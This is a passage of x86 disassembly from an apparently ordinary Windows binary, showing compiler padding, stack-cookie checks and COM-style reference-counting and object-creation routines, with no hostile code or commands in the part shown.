  401ee2:	int3   
  401ee3:	int3   
  401ee4:	int3   
  401ee5:	int3   
  401ee6:	int3   
  401ee7:	int3   
  401ee8:	int3   
  401ee9:	int3   
  401eea:	int3   
  401eeb:	int3   
  401eec:	int3   
  401eed:	int3   
  401eee:	int3   
  401eef:	int3   
  401ef0:	mov    edi,edi
  401ef2:	push   ebp
  401ef3:	mov    ebp,esp
  401ef5:	sub    esp,0x10
  401ef8:	push   esi
  401ef9:	call   0x401ceb
  401efe:	test   eax,eax
  401f00:	je     0x401f65
  401f02:	push   0x2021f
  401f07:	push   DWORD PTR [ebp+0xc]
  401f0a:	push   ecx
  401f0b:	lea    ecx,[ebp-0x10]
  401f0e:	call   0x401d1e
  401f13:	push   DWORD PTR [ebp+0x10]
  401f16:	mov    esi,0x4013f0
  401f1b:	lea    ecx,[ebp-0x10]
  401f1e:	push   esi
  401f1f:	call   0x401dae
  401f24:	test   al,al
  401f26:	je     0x401f51
  401f28:	push   0x2011f
  401f2d:	push   DWORD PTR [ebp+0xc]
  401f30:	push   ecx
  401f31:	lea    ecx,[ebp-0x8]
  401f34:	call   0x401d1e
  401f39:	push   DWORD PTR [ebp+0x10]
  401f3c:	lea    ecx,[ebp-0x8]
  401f3f:	push   esi
  401f40:	call   0x401dae
  401f45:	lea    ecx,[ebp-0x8]
  401f48:	test   al,al
  401f4a:	jne    0x401f5e
  401f4c:	call   0x401d91
  401f51:	lea    ecx,[ebp-0x10]
  401f54:	call   0x401d91
  401f59:	xor    eax,eax
  401f5b:	inc    eax
  401f5c:	jmp    0x401f94
  401f5e:	call   0x401d91
  401f63:	jmp    0x401f8a
  401f65:	push   0x2001f
  401f6a:	push   DWORD PTR [ebp+0xc]
  401f6d:	push   ecx
  401f6e:	lea    ecx,[ebp-0x10]
  401f71:	call   0x401d1e
  401f76:	push   DWORD PTR [ebp+0x10]
  401f79:	lea    ecx,[ebp-0x10]
  401f7c:	push   0x4013f0
  401f81:	call   0x401dae
  401f86:	test   al,al
  401f88:	je     0x401f51
  401f8a:	lea    ecx,[ebp-0x10]
  401f8d:	call   0x401d91
  401f92:	xor    eax,eax
  401f94:	pop    esi
  401f95:	mov    esp,ebp
  401f97:	pop    ebp
  401f98:	ret    0xc
  401f9b:	int3   
  401f9c:	int3   
  401f9d:	int3   
  401f9e:	int3   
  401f9f:	int3   
  401fa0:	mov    edi,edi
  401fa2:	push   ebp
  401fa3:	mov    ebp,esp
  401fa5:	sub    esp,0x10
  401fa8:	push   esi
  401fa9:	call   0x401ceb
  401fae:	test   eax,eax
  401fb0:	je     0x402015
  401fb2:	push   0x2021f
  401fb7:	push   DWORD PTR [ebp+0xc]
  401fba:	push   ecx
  401fbb:	lea    ecx,[ebp-0x10]
  401fbe:	call   0x401d1e
  401fc3:	push   DWORD PTR [ebp+0x10]
  401fc6:	mov    esi,0x401410
  401fcb:	lea    ecx,[ebp-0x10]
  401fce:	push   esi
  401fcf:	call   0x401dae
  401fd4:	test   al,al
  401fd6:	je     0x402001
  401fd8:	push   0x2011f
  401fdd:	push   DWORD PTR [ebp+0xc]
  401fe0:	push   ecx
  401fe1:	lea    ecx,[ebp-0x8]
  401fe4:	call   0x401d1e
  401fe9:	push   DWORD PTR [ebp+0x10]
  401fec:	lea    ecx,[ebp-0x8]
  401fef:	push   esi
  401ff0:	call   0x401dae
  401ff5:	lea    ecx,[ebp-0x8]
  401ff8:	test   al,al
  401ffa:	jne    0x40200e
  401ffc:	call   0x401d91
  402001:	lea    ecx,[ebp-0x10]
  402004:	call   0x401d91
  402009:	xor    eax,eax
  40200b:	inc    eax
  40200c:	jmp    0x402044
  40200e:	call   0x401d91
  402013:	jmp    0x40203a
  402015:	push   0x2001f
  40201a:	push   DWORD PTR [ebp+0xc]
  40201d:	push   ecx
  40201e:	lea    ecx,[ebp-0x10]
  402021:	call   0x401d1e
  402026:	push   DWORD PTR [ebp+0x10]
  402029:	lea    ecx,[ebp-0x10]
  40202c:	push   0x401410
  402031:	call   0x401dae
  402036:	test   al,al
  402038:	je     0x402001
  40203a:	lea    ecx,[ebp-0x10]
  40203d:	call   0x401d91
  402042:	xor    eax,eax
  402044:	pop    esi
  402045:	mov    esp,ebp
  402047:	pop    ebp
  402048:	ret    0xc
  40204b:	int3   
  40204c:	int3   
  40204d:	int3   
  40204e:	int3   
  40204f:	int3   
  402050:	xor    eax,eax
  402052:	ret    
  402053:	int3   
  402054:	int3   
  402055:	int3   
  402056:	int3   
  402057:	int3   
  402058:	int3   
  402059:	int3   
  40205a:	int3   
  40205b:	int3   
  40205c:	int3   
  40205d:	int3   
  40205e:	int3   
  40205f:	int3   
  402060:	mov    edi,edi
  402062:	push   ebp
  402063:	mov    ebp,esp
  402065:	mov    eax,DWORD PTR [ebp+0xc]
  402068:	test   eax,eax
  40206a:	jne    0x402073
  40206c:	mov    eax,0x80004003
  402071:	jmp    0x40207b
  402073:	mov    DWORD PTR [eax],0x1
  402079:	xor    eax,eax
  40207b:	pop    ebp
  40207c:	ret    0x8
  40207f:	int3   
  402080:	int3   
  402081:	int3   
  402082:	int3   
  402083:	int3   
  402084:	int3   
  402085:	int3   
  402086:	int3   
  402087:	int3   
  402088:	int3   
  402089:	int3   
  40208a:	int3   
  40208b:	int3   
  40208c:	int3   
  40208d:	int3   
  40208e:	int3   
  40208f:	int3   
  402090:	mov    edi,edi
  402092:	push   ebp
  402093:	mov    ebp,esp
  402095:	cmp    DWORD PTR [ebp+0xc],0x0
  402099:	je     0x4020a2
  40209b:	mov    eax,0x8002000b
  4020a0:	jmp    0x4020ad
  4020a2:	push   DWORD PTR [ebp+0x14]
  4020a5:	push   DWORD PTR [ebp+0x10]
  4020a8:	call   0x403026
  4020ad:	pop    ebp
  4020ae:	ret    0x10
  4020b1:	int3   
  4020b2:	int3   
  4020b3:	int3   
  4020b4:	int3   
  4020b5:	int3   
  4020b6:	int3   
  4020b7:	int3   
  4020b8:	int3   
  4020b9:	int3   
  4020ba:	int3   
  4020bb:	int3   
  4020bc:	int3   
  4020bd:	int3   
  4020be:	int3   
  4020bf:	int3   
  4020c0:	mov    edi,edi
  4020c2:	push   ebp
  4020c3:	mov    ebp,esp
  4020c5:	push   DWORD PTR [ebp+0x1c]
  4020c8:	push   DWORD PTR [ebp+0x18]
  4020cb:	push   DWORD PTR [ebp+0x14]
  4020ce:	push   DWORD PTR [ebp+0x10]
  4020d1:	push   ecx
  4020d2:	call   0x402929
  4020d7:	pop    ebp
  4020d8:	ret    0x18
  4020db:	int3   
  4020dc:	int3   
  4020dd:	int3   
  4020de:	int3   
  4020df:	int3   
  4020e0:	mov    edi,edi
  4020e2:	push   ebp
  4020e3:	mov    ebp,esp
  4020e5:	push   ecx
  4020e6:	mov    eax,ds:0x407008
  4020eb:	xor    eax,ebp
  4020ed:	mov    DWORD PTR [ebp-0x4],eax
  4020f0:	mov    eax,ds:0x407040
  4020f5:	xor    ecx,ecx
  4020f7:	test   eax,eax
  4020f9:	je     0x402103
  4020fb:	cmp    DWORD PTR ds:0x407048,ecx
  402101:	jne    0x402112
  402103:	push   DWORD PTR [ebp+0x14]
  402106:	call   0x402ddc
  40210b:	mov    ecx,eax
  40210d:	mov    eax,ds:0x407040
  402112:	test   eax,eax
  402114:	je     0x40213e
  402116:	push   esi
  402117:	push   DWORD PTR [ebp+0x28]
  40211a:	mov    esi,DWORD PTR [eax]
  40211c:	push   DWORD PTR [ebp+0x24]
  40211f:	push   DWORD PTR [ebp+0x20]
  402122:	mov    ecx,DWORD PTR [esi+0x2c]
  402125:	push   DWORD PTR [ebp+0x1c]
  402128:	push   DWORD PTR [ebp+0x18]
  40212b:	push   DWORD PTR [ebp+0xc]
  40212e:	push   DWORD PTR [ebp+0x8]
  402131:	push   eax
  402132:	call   DWORD PTR ds:0x4081a0
  402138:	call   DWORD PTR [esi+0x2c]
  40213b:	mov    ecx,eax
  40213d:	pop    esi
  40213e:	mov    eax,ecx
  402140:	mov    ecx,DWORD PTR [ebp-0x4]
  402143:	xor    ecx,ebp
  402145:	call   0x406340
  40214a:	mov    esp,ebp
  40214c:	pop    ebp
  40214d:	ret    0x24
  402150:	int3   
  402151:	int3   
  402152:	int3   
  402153:	int3   
  402154:	int3   
  402155:	int3   
  402156:	int3   
  402157:	int3   
  402158:	int3   
  402159:	int3   
  40215a:	int3   
  40215b:	int3   
  40215c:	int3   
  40215d:	int3   
  40215e:	int3   
  40215f:	int3   
  402160:	mov    edi,edi
  402162:	push   ebp
  402163:	mov    ebp,esp
  402165:	push   ecx
  402166:	mov    eax,ds:0x407008
  40216b:	xor    eax,ebp
  40216d:	mov    DWORD PTR [ebp-0x4],eax
  402170:	push   edi
  402171:	mov    edi,DWORD PTR [ebp+0x10]
  402174:	test   edi,edi
  402176:	jne    0x40217f
  402178:	mov    eax,0x80004003
  40217d:	jmp    0x4021fc
  40217f:	and    DWORD PTR [edi],0x0
  402182:	push   ebx
  402183:	push   esi
  402184:	push   0x28
  402186:	mov    esi,0x8007000e
  40218b:	call   0x405fa4
  402190:	mov    ebx,eax
  402192:	pop    ecx
  402193:	test   ebx,ebx
  402195:	je     0x4021b3
  402197:	and    DWORD PTR [ebx+0x4],0x0
  40219b:	lea    edi,[ebx+0x8]
  40219e:	push   0x6
  4021a0:	xor    eax,eax
  4021a2:	pop    ecx
  4021a3:	rep stos DWORD PTR es:[edi],eax
  4021a5:	mov    edi,DWORD PTR [ebp+0x10]
  4021a8:	mov    BYTE PTR [ebx+0x20],al
  4021ab:	mov    DWORD PTR [ebx],0x401330
  4021b1:	jmp    0x4021b5
  4021b3:	xor    ebx,ebx
  4021b5:	test   ebx,ebx
  4021b7:	je     0x4021f8
  4021b9:	mov    eax,DWORD PTR [ebp+0x8]
  4021bc:	lea    ecx,[ebx+0x8]
  4021bf:	mov    DWORD PTR [ebx+0x24],eax
  4021c2:	call   0x4028dd
  4021c7:	mov    esi,eax
  4021c9:	test   esi,esi
  4021cb:	js     0x4021d5
  4021cd:	xor    esi,esi
  4021cf:	mov    BYTE PTR [ebx+0x20],0x1
  4021d3:	test   esi,esi
  4021d5:	jne    0x4021f0
  4021d7:	mov    eax,DWORD PTR [ebx]
  4021d9:	push   edi
  4021da:	push   DWORD PTR [ebp+0xc]
  4021dd:	mov    esi,DWORD PTR [eax]
  4021df:	mov    ecx,esi
  4021e1:	push   ebx
  4021e2:	call   DWORD PTR ds:0x4081a0
  4021e8:	call   esi
  4021ea:	mov    esi,eax
  4021ec:	test   esi,esi
  4021ee:	je     0x4021f8
  4021f0:	push   ecx
  4021f1:	mov    ecx,ebx
  4021f3:	call   0x402247
  4021f8:	mov    eax,esi
  4021fa:	pop    esi
  4021fb:	pop    ebx
  4021fc:	mov    ecx,DWORD PTR [ebp-0x4]
  4021ff:	xor    ecx,ebp
  402201:	pop    edi
  402202:	call   0x406340
  402207:	mov    esp,ebp
  402209:	pop    ebp
  40220a:	ret    0xc
  40220d:	int3   
  40220e:	int3   
  40220f:	int3   
  402210:	int3   
  402211:	int3   
  402212:	int3   
  402213:	int3   
  402214:	int3   
  402215:	int3   
  402216:	int3   
  402217:	int3   
  402218:	int3   
  402219:	int3   
  40221a:	int3   
  40221b:	int3   
  40221c:	int3   
  40221d:	int3   
  40221e:	int3   
  40221f:	int3   
  402220:	mov    edi,edi
  402222:	push   ebp
  402223:	mov    ebp,esp
  402225:	mov    ecx,DWORD PTR [ebp+0x8]
  402228:	mov    edx,DWORD PTR [ebp+0xc]
  40222b:	push   DWORD PTR [ebp+0x10]
  40222e:	test   ecx,ecx
  402230:	jne    0x402239
  402232:	call   0x4022f1
  402237:	jmp    0x40223e
  402239:	call   0x4023a9
  40223e:	pop    ebp
  40223f:	ret    0xc
  402242:	int3   
  402243:	int3   
  402244:	int3   
  402245:	int3   
  402246:	int3   
  402247:	mov    edi,edi
  402249:	push   esi
  40224a:	mov    esi,ecx
  40224c:	lea    eax,[esi+0x8]
  40224f:	mov    DWORD PTR [esi+0x4],0xc0000001
  402256:	mov    DWORD PTR [esi],0x401344
  40225c:	cmp    BYTE PTR [eax+0x18],0x0
  402260:	je     0x40226d
  402262:	push   eax
  402263:	mov    BYTE PTR [eax+0x18],0x0
  402267:	call   DWORD PTR ds:0x408064
  40226d:	push   esi
  40226e:	call   0x405f80
  402273:	pop    ecx
  402274:	mov    eax,esi
  402276:	pop    esi
  402277:	ret    0x4
  40227a:	int3   
  40227b:	int3   
  40227c:	int3   
  40227d:	int3   
  40227e:	int3   
  40227f:	int3   
  402280:	mov    edi,edi
  402282:	push   ebp
  402283:	mov    ebp,esp
  402285:	mov    ecx,DWORD PTR [ebp+0x8]
  402288:	xor    eax,eax
  40228a:	inc    eax
  40228b:	lock xadd DWORD PTR [ecx+0x4],eax
  402290:	inc    eax
  402291:	pop    ebp
  402292:	ret    0x4
  402295:	int3   
  402296:	int3   
  402297:	int3   
  402298:	int3   
  402299:	int3   
  40229a:	int3   
  40229b:	int3   
  40229c:	int3   
  40229d:	int3   
  40229e:	int3   
  40229f:	int3   
  4022a0:	mov    edi,edi
  4022a2:	push   ebp
  4022a3:	mov    ebp,esp
  4022a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4022a8:	push   esi
  4022a9:	or     esi,0xffffffff
  4022ac:	lock xadd DWORD PTR [ecx+0x4],esi
  4022b1:	dec    esi
  4022b2:	jne    0x4022be
  4022b4:	test   ecx,ecx
  4022b6:	je     0x4022be
  4022b8:	push   ecx
  4022b9:	call   0x402247
  4022be:	mov    eax,esi
  4022c0:	pop    esi
  4022c1:	pop    ebp
  4022c2:	ret    0x4
  4022c5:	int3   
  4022c6:	int3   
  4022c7:	int3   
  4022c8:	int3   
  4022c9:	int3   
  4022ca:	int3   
  4022cb:	int3   
  4022cc:	int3   
  4022cd:	int3   
  4022ce:	int3   
  4022cf:	int3   
  4022d0:	mov    edi,edi
  4022d2:	push   ebp
  4022d3:	mov    ebp,esp
  4022d5:	push   DWORD PTR [ebp+0x10]
  4022d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4022db:	mov    edx,0x401438
  4022e0:	push   DWORD PTR [ebp+0xc]
  4022e3:	call   0x4030f6
  4022e8:	pop    ebp
  4022e9:	ret    0xc
  4022ec:	int3   
  4022ed:	int3   
  4022ee:	int3   
  4022ef:	int3   
  4022f0:	int3   
  4022f1:	mov    edi,edi
  4022f3:	push   ebp
  4022f4:	mov    ebp,esp
  4022f6:	push   ecx
  4022f7:	push   ecx
  4022f8:	mov    eax,ds:0x407008
  4022fd:	xor    eax,ebp
  4022ff:	mov    DWORD PTR [ebp-0x4],eax
  402302:	push   esi
  402303:	mov    esi,DWORD PTR [ebp+0x8]
  402306:	mov    DWORD PTR [ebp-0x8],edx
  402309:	test   esi,esi
  40230b:	jne    0x402314
  40230d:	mov    eax,0x80004003
  402312:	jmp    0x402393
  402314:	and    DWORD PTR [esi],0x0
  402317:	push   ebx
  402318:	push   edi
  402319:	push   0x8
  40231b:	mov    edi,0x8007000e
  402320:	call   0x405fa4
  402325:	mov    ebx,eax
  402327:	pop    ecx
  402328:	test   ebx,ebx
  40232a:	je     0x402357
  40232c:	mov    edi,DWORD PTR ds:0x407414
  402332:	and    DWORD PTR [ebx+0x4],0x0
  402336:	mov    DWORD PTR [ebx],0x401304
  40233c:	mov    eax,DWORD PTR [edi]
  40233e:	mov    esi,DWORD PTR [eax+0x4]
  402341:	mov    ecx,esi
  402343:	call   DWORD PTR ds:0x4081a0
  402349:	mov    ecx,edi
  40234b:	call   esi
  40234d:	mov    esi,DWORD PTR [ebp+0x8]
  402350:	mov    edi,0x8007000e
  402355:	jmp    0x402359
  402357:	xor    ebx,ebx
  402359:	test   ebx,ebx
  40235b:	je     0x40238f
  40235d:	inc    DWORD PTR [ebx+0x4]
  402360:	dec    DWORD PTR [ebx+0x4]
  402363:	mov    eax,DWORD PTR [ebx]
  402365:	push   esi
  402366:	push   DWORD PTR [ebp-0x8]
  402369:	mov    esi,DWORD PTR [eax]
  40236b:	mov    ecx,esi
  40236d:	push   ebx
  40236e:	call   DWORD PTR ds:0x4081a0
  402374:	call   esi
  402376:	mov    edi,eax
  402378:	test   edi,edi
  40237a:	je     0x40238f
  40237c:	mov    edx,DWORD PTR [ebx]
  40237e:	push   0x1
  402380:	mov    esi,DWORD PTR [edx+0x28]
  402383:	mov    ecx,esi
  402385:	call   DWORD PTR ds:0x4081a0
  40238b:	mov    ecx,ebx
  40238d:	call   esi
  40238f:	mov    eax,edi
  402391:	pop    edi
  402392:	pop    ebx
  402393:	mov    ecx,DWORD PTR [ebp-0x4]
  402396:	xor    ecx,ebp
  402398:	pop    esi
  402399:	call   0x406340
  40239e:	mov    esp,ebp
  4023a0:	pop    ebp
  4023a1:	ret    0x4
  4023a4:	int3   
  4023a5:	int3   
  4023a6:	int3   
  4023a7:	int3   
  4023a8:	int3   
  4023a9:	mov    edi,edi
  4023ab:	push   ebp
  4023ac:	mov    ebp,esp
  4023ae:	sub    esp,0xc
  4023b1:	mov    eax,ds:0x407008
  4023b6:	xor    eax,ebp
  4023b8:	mov    DWORD PTR [ebp-0x4],eax
  4023bb:	push   esi
  4023bc:	mov    esi,DWORD PTR [ebp+0x8]
  4023bf:	mov    DWORD PTR [ebp-0xc],edx
  4023c2:	mov    DWORD PTR [ebp-0x8],ecx
  4023c5:	test   esi,esi
  4023c7:	jne    0x4023d3
  4023c9:	mov    eax,0x80004003
  4023ce:	jmp    0x402459
  4023d3:	and    DWORD PTR [esi],0x0
  4023d6:	push   ebx
  4023d7:	push   edi
  4023d8:	push   0x10
  4023da:	mov    edi,0x8007000e
  4023df:	call   0x405fa4
  4023e4:	mov    ebx,eax
  4023e6:	pop    ecx
  4023e7:	test   ebx,ebx
  4023e9:	je     0x402423
  4023eb:	and    DWORD PTR [ebx+0x4],0x0
  4023ef:	mov    edi,DWORD PTR ds:0x407414
  4023f5:	mov    eax,DWORD PTR [ebp-0x8]
  4023f8:	mov    DWORD PTR [ebx],0x4012f4
  4023fe:	mov    DWORD PTR [ebx+0x8],0x4012cc
  402405:	mov    DWORD PTR [ebx+0xc],eax
  402408:	mov    eax,DWORD PTR [edi]
  40240a:	mov    esi,DWORD PTR [eax+0x4]
  40240d:	mov    ecx,esi
  40240f:	call   DWORD PTR ds:0x4081a0
  402415:	mov    ecx,edi
  402417:	call   esi
  402419:	mov    esi,DWORD PTR [ebp+0x8]
  40241c:	mov    edi,0x8007000e
  402421:	jmp    0x402425
  402423:	xor    ebx,ebx
  402425:	test   ebx,ebx
  402427:	je     0x402455
  402429:	mov    eax,DWORD PTR [ebx]
  40242b:	push   esi
  40242c:	push   DWORD PTR [ebp-0xc]
  40242f:	mov    esi,DWORD PTR [eax]
  402431:	mov    ecx,esi
  402433:	push   ebx
  402434:	call   DWORD PTR ds:0x4081a0
  40243a:	call   esi
  40243c:	mov    edi,eax
  40243e:	test   edi,edi
  402440:	je     0x402455
  402442:	mov    edx,DWORD PTR [ebx]
  402444:	push   0x1
  402446:	mov    esi,DWORD PTR [edx+0xc]
  402449:	mov    ecx,esi
  40244b:	call   DWORD PTR ds:0x4081a0
  402451:	mov    ecx,ebx
  402453:	call   esi
  402455:	mov    eax,edi
  402457:	pop    edi
  402458:	pop    ebx
  402459:	mov    ecx,DWORD PTR [ebp-0x4]
  40245c:	xor    ecx,ebp
  40245e:	pop    esi
  40245f:	call   0x406340
  402464:	mov    esp,ebp
  402466:	pop    ebp
  402467:	ret    0x4
  40246a:	int3   
  40246b:	int3   
  40246c:	int3   
  40246d:	int3   
  40246e:	int3   
  40246f:	mov    edi,edi
  402471:	push   ebp
  402472:	mov    ebp,esp
  402474:	push   ecx
  402475:	mov    eax,ds:0x407008
  40247a:	xor    eax,ebp
  40247c:	mov    DWORD PTR [ebp-0x4],eax
  40247f:	push   esi
  402480:	push   edi
  402481:	mov    edi,DWORD PTR ds:0x407414
  402487:	mov    DWORD PTR [ecx],0x401304
  40248d:	mov    DWORD PTR [ecx+0x4],0xc0000001
  402494:	mov    eax,DWORD PTR [edi]
  402496:	mov    esi,DWORD PTR [eax+0x8]
  402499:	mov    ecx,esi
  40249b:	call   DWORD PTR ds:0x4081a0
  4024a1:	mov    ecx,edi
  4024a3:	call   esi
  4024a5:	mov    ecx,DWORD PTR [ebp-0x4]
  4024a8:	pop    edi
  4024a9:	xor    ecx,ebp
  4024ab:	pop    esi
  4024ac:	call   0x406340
  4024b1:	mov    esp,ebp
  4024b3:	pop    ebp
  4024b4:	ret    
  4024b5:	int3   
  4024b6:	int3   
  4024b7:	int3   
  4024b8:	int3   
  4024b9:	int3   
  4024ba:	int3   
  4024bb:	int3   
  4024bc:	int3   
  4024bd:	int3   
  4024be:	int3   
  4024bf:	int3   
  4024c0:	mov    edi,edi
  4024c2:	push   ebp
  4024c3:	mov    ebp,esp
  4024c5:	mov    eax,DWORD PTR [ebp+0x8]
  4024c8:	inc    DWORD PTR [eax+0x4]
  4024cb:	mov    eax,DWORD PTR [eax+0x4]
  4024ce:	pop    ebp
  4024cf:	ret    0x4
  4024d2:	int3   
  4024d3:	int3   
  4024d4:	int3   
  4024d5:	int3   
  4024d6:	int3   
  4024d7:	int3   
  4024d8:	int3   
  4024d9:	int3   
  4024da:	int3   
  4024db:	int3   
  4024dc:	int3   
  4024dd:	int3   
  4024de:	int3   
  4024df:	int3   
  4024e0:	mov    edi,edi
  4024e2:	push   ebp
  4024e3:	mov    ebp,esp
  4024e5:	push   ecx
  4024e6:	push   ecx
  4024e7:	mov    eax,ds:0x407008
  4024ec:	xor    eax,ebp
  4024ee:	mov    DWORD PTR [ebp-0x4],eax
  4024f1:	push   ebx
  4024f2:	mov    ebx,DWORD PTR [ebp+0x8]
  4024f5:	dec    DWORD PTR [ebx+0x4]
  4024f8:	mov    eax,DWORD PTR [ebx+0x4]
  4024fb:	mov    DWORD PTR [ebp-0x8],eax
  4024fe:	test   eax,eax
  402500:	jne    0x40254e
  402502:	push   esi
  402503:	push   edi
  402504:	mov    edi,DWORD PTR ds:0x407414
  40250a:	mov    eax,DWORD PTR [edi]
  40250c:	mov    esi,DWORD PTR [eax+0x4]
  40250f:	mov    ecx,esi
  402511:	call   DWORD PTR ds:0x4081a0
  402517:	mov    ecx,edi
  402519:	call   esi
  40251b:	test   ebx,ebx
  40251d:	je     0x402532
  40251f:	mov    eax,DWORD PTR [ebx]
  402521:	push   0x1
  402523:	mov    esi,DWORD PTR [eax+0x28]
  402526:	mov    ecx,esi
  402528:	call   DWORD PTR ds:0x4081a0
  40252e:	mov    ecx,ebx
  402530:	call   esi
  402532:	mov    edi,DWORD PTR ds:0x407414
  402538:	mov    edx,DWORD PTR [edi]
  40253a:	mov    esi,DWORD PTR [edx+0x8]
  40253d:	mov    ecx,esi
  40253f:	call   DWORD PTR ds:0x4081a0
  402545:	mov    ecx,edi
  402547:	call   esi
  402549:	mov    eax,DWORD PTR [ebp-0x8]
  40254c:	pop    edi
  40254d:	pop    esi
  40254e:	mov    ecx,DWORD PTR [ebp-0x4]
  402551:	xor    ecx,ebp
  402553:	pop    ebx
  402554:	call   0x406340
  402559:	mov    esp,ebp
  40255b:	pop    ebp
  40255c:	ret    0x4
  40255f:	int3   
  402560:	int3   
  402561:	int3   
  402562:	int3   
  402563:	int3   
  402564:	int3   
  402565:	int3   
  402566:	int3   
  402567:	int3   
  402568:	int3   
  402569:	int3   
  40256a:	int3   
  40256b:	int3   
  40256c:	int3   
  40256d:	int3   
  40256e:	int3   
  40256f:	int3   
  402570:	mov    edi,edi
  402572:	push   ebp
  402573:	mov    ebp,esp
  402575:	push   DWORD PTR [ebp+0x10]
  402578:	mov    ecx,DWORD PTR [ebp+0x8]
  40257b:	mov    edx,0x401480
  402580:	push   DWORD PTR [ebp+0xc]
  402583:	call   0x4030f6
  402588:	pop    ebp
  402589:	ret    0xc
  40258c:	int3   
  40258d:	int3   
  40258e:	int3   
  40258f:	int3   
  402590:	int3   
  402591:	mov    edi,edi
  402593:	push   ebp
  402594:	mov    ebp,esp
  402596:	push   ecx
  402597:	mov    eax,ds:0x407008
  40259c:	xor    eax,ebp
  40259e:	mov    DWORD PTR [ebp-0x4],eax
  4025a1:	push   esi
  4025a2:	push   edi
  4025a3:	mov    edi,DWORD PTR ds:0x407414
  4025a9:	mov    DWORD PTR [ecx],0x4012f4
  4025af:	mov    DWORD PTR [ecx+0x4],0xc0000001
  4025b6:	mov    eax,DWORD PTR [edi]
  4025b8:	mov    esi,DWORD PTR [eax+0x8]
  4025bb:	mov    ecx,esi
  4025bd:	call   DWORD PTR ds:0x4081a0
  4025c3:	mov    ecx,edi
  4025c5:	call   esi
  4025c7:	mov    ecx,DWORD PTR [ebp-0x4]
  4025ca:	pop    edi
  4025cb:	xor    ecx,ebp
  4025cd:	pop    esi
  4025ce:	call   0x406340
  4025d3:	mov    esp,ebp
  4025d5:	pop    ebp
  4025d6:	ret    
  4025d7:	int3   
  4025d8:	int3   
  4025d9:	int3   
  4025da:	int3   
  4025db:	int3   
  4025dc:	int3   
  4025dd:	int3   
  4025de:	int3   
  4025df:	int3   
  4025e0:	mov    edi,edi
  4025e2:	push   ebp
  4025e3:	mov    ebp,esp
  4025e5:	push   ecx
  4025e6:	push   ecx
  4025e7:	mov    eax,ds:0x407008
  4025ec:	xor    eax,ebp
  4025ee:	mov    DWORD PTR [ebp-0x4],eax
  4025f1:	push   ebx
  4025f2:	mov    ebx,DWORD PTR [ebp+0x8]
  4025f5:	dec    DWORD PTR [ebx+0x4]
  4025f8:	mov    eax,DWORD PTR [ebx+0x4]
  4025fb:	mov    DWORD PTR [ebp-0x8],eax
  4025fe:	test   eax,eax
  402600:	jne    0x40264e
  402602:	push   esi
  402603:	push   edi
  402604:	mov    edi,DWORD PTR ds:0x407414
  40260a:	mov    eax,DWORD PTR [edi]
  40260c:	mov    esi,DWORD PTR [eax+0x4]
  40260f:	mov    ecx,esi
  402611:	call   DWORD PTR ds:0x4081a0
  402617:	mov    ecx,edi
  402619:	call   esi
  40261b:	test   ebx,ebx
  40261d:	je     0x402632
  40261f:	mov    eax,DWORD PTR [ebx]
  402621:	push   0x1
  402623:	mov    esi,DWORD PTR [eax+0xc]
  402626:	mov    ecx,esi
  402628:	call   DWORD PTR ds:0x4081a0
  40262e:	mov    ecx,ebx
  402630:	call   esi
  402632:	mov    edi,DWORD PTR ds:0x407414
  402638:	mov    edx,DWORD PTR [edi]
  40263a:	mov    esi,DWORD PTR [edx+0x8]
  40263d:	mov    ecx,esi
  40263f:	call   DWORD PTR ds:0x4081a0
  402645:	mov    ecx,edi
  402647:	call   esi
  402649:	mov    eax,DWORD PTR [ebp-0x8]
  40264c:	pop    edi
  40264d:	pop    esi
  40264e:	mov    ecx,DWORD PTR [ebp-0x4]
  402651:	xor    ecx,ebp
  402653:	pop    ebx
  402654:	call   0x406340
  402659:	mov    esp,ebp
  40265b:	pop    ebp
  40265c:	ret    0x4
  40265f:	int3   
  402660:	int3   
  402661:	int3   
  402662:	int3   
  402663:	int3   
  402664:	int3   
  402665:	int3   
  402666:	int3   
  402667:	int3   
  402668:	int3   
  402669:	int3   
  40266a:	int3   
  40266b:	int3   
  40266c:	int3   
  40266d:	int3   
  40266e:	int3   
  40266f:	int3   
  402670:	mov    edi,edi
  402672:	push   ebp
  402673:	mov    ebp,esp
  402675:	push   ecx
  402676:	mov    eax,ds:0x407008
  40267b:	xor    eax,ebp
  40267d:	mov    DWORD PTR [ebp-0x4],eax
  402680:	mov    edx,DWORD PTR [ebp+0x10]
  402683:	test   edx,edx
  402685:	jne    0x40268e
  402687:	mov    eax,0x80004003
  40268c:	jmp    0x4026cf
  40268e:	mov    ecx,DWORD PTR [ebp+0xc]
  402691:	push   edi
  402692:	xor    edi,edi
  402694:	mov    DWORD PTR [edx],edi
  402696:	call   0x4030a8
  40269b:	test   eax,eax
  40269d:	je     0x4026b8
  40269f:	mov    ecx,DWORD PTR [ebp+0x8]
  4026a2:	mov    DWORD PTR [edx],ecx
  4026a4:	push   esi
  4026a5:	push   ecx
  4026a6:	mov    eax,DWORD PTR [ecx]
  4026a8:	mov    esi,DWORD PTR [eax+0x4]
  4026ab:	mov    ecx,esi
  4026ad:	call   DWORD PTR ds:0x4081a0
  4026b3:	call   esi
  4026b5:	pop    esi
  4026b6:	jmp    0x4026cc
  4026b8:	push   edx
  4026b9:	push   ecx
  4026ba:	mov    ecx,DWORD PTR [ebp+0x8]
  4026bd:	mov    edx,0x401480
  4026c2:	lea    ecx,[ecx+0x8]
  4026c5:	call   0x4030f6
  4026ca:	mov    edi,eax
  4026cc:	mov    eax,edi
  4026ce:	pop    edi
  4026cf:	mov    ecx,DWORD PTR [ebp-0x4]
  4026d2:	xor    ecx,ebp
  4026d4:	call   0x406340
  4026d9:	mov    esp,ebp
  4026db:	pop    ebp
  4026dc:	ret    0xc
  4026df:	int3   
  4026e0:	int3   
  4026e1:	int3   
  4026e2:	int3   
  4026e3:	int3   
  4026e4:	int3   
  4026e5:	int3   
  4026e6:	int3   
  4026e7:	int3   
  4026e8:	int3   
  4026e9:	int3   
  4026ea:	int3   
  4026eb:	int3   
  4026ec:	int3   
  4026ed:	int3   
  4026ee:	int3   
  4026ef:	int3   
  4026f0:	mov    edi,edi
  4026f2:	push   ebp
  4026f3:	mov    ebp,esp
  4026f5:	push   ecx
  4026f6:	mov    eax,ds:0x407008
  4026fb:	xor    eax,ebp
  4026fd:	mov    DWORD PTR [ebp-0x4],eax
  402700:	mov    eax,DWORD PTR [ebp+0x8]
  402703:	push   esi
  402704:	mov    eax,DWORD PTR [eax+0x4]
  402707:	push   eax
  402708:	mov    ecx,DWORD PTR [eax]
  40270a:	mov    esi,DWORD PTR [ecx+0x4]
  40270d:	mov    ecx,esi
